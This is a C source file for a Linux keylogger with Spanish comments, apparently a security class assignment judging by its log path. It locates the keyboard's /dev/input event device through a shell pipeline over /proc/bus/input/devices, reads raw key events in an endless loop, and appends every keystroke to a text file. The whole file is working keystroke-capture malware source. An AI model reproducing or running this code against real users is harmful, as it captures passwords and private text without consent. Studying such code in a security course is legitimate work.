#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/kevin/Descargas/TareaSeguridad/keylogger.txt"

// Mapeo de teclas
char *key_map[] = {
    "", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
    "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "LCTRL",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "LSHIFT", "\\", "z", "x", 
    "c", "v", "b", "n", "m", ",", ".", "/", "RSHIFT", "*", "LALT", "SPACE", "CAPSLOCK",
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK",
    "KP7", "KP8", "KP9", "KP_MINUS", "KP4", "KP5", "KP6", "KP_PLUS", "KP1", "KP2", "KP3", 
    "KP0", "KP_DOT", "", "", "", "F11", "F12", "", "", "", "", "", "", "", "", "", "", "",
    "KP_ENTER", "RCTRL", "", "", "RALT", "", "HOME", "UP", "PGUP", "LEFT", "RIGHT", "END", 
    "DOWN", "PGDN", "INS", "DEL", "", "", "", "", "", "", "", "PAUSE", "", "", "", "", "", 
    "", "", "", "", "", "", "", "", "LWIN", "RWIN", "MENU"
    // Puedes continuar agregando más teclas según sea necesario
};

char *getEvent();

int main(){
    struct input_event ev;
    static char path_keyboard[20] = "/dev/input/";
    strcat(path_keyboard, getEvent());
    path_keyboard[strlen(path_keyboard)-1] = 0;

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard < 0) {
        perror("Error al abrir el dispositivo de teclado");
        return 1;
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        perror("Error al abrir el archivo de registro");
        return 1;
    }

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) { // ev.value == 0 para detectar cuando se suelta la tecla
            if (ev.code < sizeof(key_map)/sizeof(key_map[0])) {
                fprintf(fp, "%s", key_map[ev.code]);
                fflush(fp); // Asegurar que los datos se escriban en el archivo inmediatamente
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent(){
    char *command =  (char *) "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);

    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}
